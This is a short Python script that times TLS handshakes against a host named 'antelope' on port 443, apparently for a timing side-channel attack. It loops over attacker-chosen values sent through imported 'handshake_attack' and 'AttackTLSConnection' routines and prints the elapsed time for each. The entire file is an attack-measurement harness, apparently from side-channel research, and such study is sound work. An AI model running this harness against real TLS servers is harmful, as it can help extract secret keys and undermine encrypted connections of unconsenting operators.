import argparse
import attack
import gc
import socket
import tls


def sample(points, samples):
    gc.disable()

    for point in points:
        for iteration in range(samples):
            gc.collect()

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect(("antelope", 443))

            start_time, response, end_time = tls.handshake_attack(sock, g=point)
            print(point, point, end_time - start_time)

            sock.close()


def sample_tlslite(points, iterations):
    gc.disable()

    for point in points:
        for iteration in range(iterations):
            gc.collect()

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect(("antelope", 443))

            connection = attack.AttackTLSConnection(sock)
            start_time, end_time = connection.performHandshakeAttack(point)
            print(point, end_time - start_time)

            connection.close()
            sock.close()


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("start", type=int, default=1)
    parser.add_argument("end", type=int, default=100)
    parser.add_argument("step", type=int, default=1)
    parser.add_argument("iterations", type=int, default=100)
    args = parser.parse_args()

    points = range(args.start, args.end + 1, args.step)
    sample(points, args.iterations)
